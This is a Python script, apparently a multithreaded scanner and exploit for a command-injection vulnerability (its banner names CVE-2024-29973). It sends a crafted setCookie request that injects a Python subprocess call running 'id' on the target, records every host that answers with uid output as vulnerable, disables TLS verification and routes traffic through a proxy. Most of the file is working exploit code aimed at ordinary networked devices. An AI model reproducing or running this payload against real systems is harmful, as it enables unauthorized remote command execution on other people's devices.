import requests
import threading
import urllib3
import os
import time
from datetime import datetime
from colorama import init, Fore, Style
from queue import Queue


init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

file_lock = threading.Lock()
max_threads = 10  
semaphore = threading.Semaphore(max_threads)
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

results_queue = Queue()

def write_to_file(data):
    with file_lock:
        with open("sus.txt", "a+") as file:
            file.write(data + "\n")

def run(url):
    try:
        vul_url = url + """/cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__("subprocess").check_output("id",+shell=True)%23"""
        headers = {'User-Agent': user_agent}
        res = requests.get(url=vul_url, headers=headers, proxies={'http':'http://127.0.0.1:7890'}, verify=False, timeout=10)
        
        if res.status_code == 200 and 'uid' in res.text:
            result = Fore.RED + f"[VULNERABLE] {url} is vulnerable"
            write_to_file(url)
        else:
            result = Fore.GREEN + f"[SAFE] {url} is not vulnerable"
        
        results_queue.put(result)
        
        
        time.sleep(1)
        
    except Exception as e:
        result = f"Error testing {url}: {e}"
        results_queue.put(result)
    finally:
        semaphore.release()

class MyThread(threading.Thread):
    def __init__(self, url):
        super().__init__()
        self.url = url

    def run(self):
        print(f"Starting scan for {self.url}")
        run(self.url)

def print_ascii_art():
    print(Fore.CYAN + """
  _____  _   __   ____        ___   ___    ___   ____        ___   ___   ___  ____   ____
 / ___/ | | / /  / __/ ____  |_  | / _ \  |_  | / / / ____  |_  | / _ \ / _ \/_  /  |_  /
/ /__   | |/ /  / _/  /___/ / __/ / // / / __/ /_  _//___/ / __/  \_, / \_, / / /  _/_ <
\___/   |___/  /___/       /____/ \___/ /____/  /_/       /____/ /___/ /___/ /_/  /____/  
          by GhostByte
    """)
    #lfillaz

def generate_urls(base_url):
    paths = [
        "/path", "/resource?id=123", "/login", "/about", "/contact", "/services", "/products", "/search", "/help", "/faq",
        "/news", "/events", "/careers", "/team", "/gallery", "/testimonials", "/blog", "/reviews", "/login?redirect=true", "/register",
        "/checkout", "/cart", "/order", "/payment", "/shipping", "/returns", "/privacy", "/terms", "/sitemap", "/support", "/feedback",
        "/partners", "/careers/jobs", "/careers/internships", "/careers/freelance", "/subscribe", "/unsubscribe", "/promotions", "/offers",
        "/coupons", "/discounts", "/deals", "/bestsellers", "/new-arrivals", "/featured", "/top-rated", "/recommended", "/trending", "/latest",
        "/most-viewed", "/most-shared", "/popular", "/staff-picks", "/specials", "/limited-edition", "/pre-orders", "/reservations",
        "/appointments", "/scheduling", "/availability", "/contact-us", "/customer-service", "/store-locator", "/find-us", "/locations",
        "/branches", "/headquarters", "/offices", "/departments", "/policies", "/guidelines", "/code-of-conduct", "/ethics", "/compliance",
        "/regulations", "/laws", "/disclaimer", "/accessibility", "/disclosures", "/alerts", "/notifications", "/announcements", "/press",
        "/media", "/publications", "/resources", "/documents", "/reports", "/whitepapers", "/case-studies", "/studies", "/research",
        "/analysis", "/reviews", "/ratings", "/forums", "/discussion", "/community", "/events/calendar", "/events/upcoming", "/events/past",
        "/conferences", "/seminars", "/workshops", "/training", "/webinars", "/tutorials", "/guides", "/how-to", "/tips", "/tricks",
        "/FAQs", "/questions", "/answers", "/feedback-survey", "/user-surveys", "/polls", "/voting", "/suggestions", "/recommendations",
        "/reviews/testimonials", "/media-kit", "/press-releases", "/media-coverage", "/feature-stories", "/newsletters", "/emails",
        "/updates", "/releases", "/products/featured", "/products/new", "/products/specials", "/products/bestsellers", "/products/latest"
    ]
   
    return [base_url + path.replace('//', '/') for path in paths]

def display_loading():
    for _ in range(10): 
        print("--- --- --- --- --- ---", end="\r")
        time.sleep(0.5)  
        print("                      ", end="\r")  
        time.sleep(0.5)  

def scan_urls(urls):
    threads = []
    for url in urls:
        semaphore.acquire()
        thread = MyThread(url)
        thread.start()
        threads.append(thread)
        time.sleep(0.5)  

    for thread in threads:
        thread.join()
    
    while not results_queue.empty():
        print(results_queue.get())
    
    print("Scan completed.")

def main():
    print_ascii_art()
    print("Script is running!")
    
    start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"Scan started at {start_time}")
    
    if os.path.exists("scope.txt"):
        print("A previous session file 'scope.txt' exists.")
        choice = input("Do you want to scan the existing URLs (y) or create a new session (n)? (y/n): ").strip().lower()
        if choice == 'y':
            with open("scope.txt", "r") as file:
                urls = [line.strip() for line in file.readlines()]
            print("Scanning existing URLs...")
            scan_urls(urls)
        elif choice == 'n':
            print("Creating a new session...")
        else:
            print("Invalid choice. Exiting.")
            return
    else:
        print("No previous session file found. Creating a new session...")
    
    base_url = input("Enter the base URL (e.g., http://example.com): ").strip()
    
    print("Generating URLs, please wait...")
    display_loading()
    
    urls = generate_urls(base_url)
    
    with open("scope.txt", "w") as file:
        for url in urls:
            file.write(url + "\n")
    
    print("URLs have been generated.")
    
    start_scan = input("Do you want to start the scan? (y/n): ").strip().lower()
    
    if start_scan == 'y':
        print("Starting new scan...")
        scan_urls(urls)
    else:
        print("Scan has been canceled.")

if __name__ == "__main__":
    main()
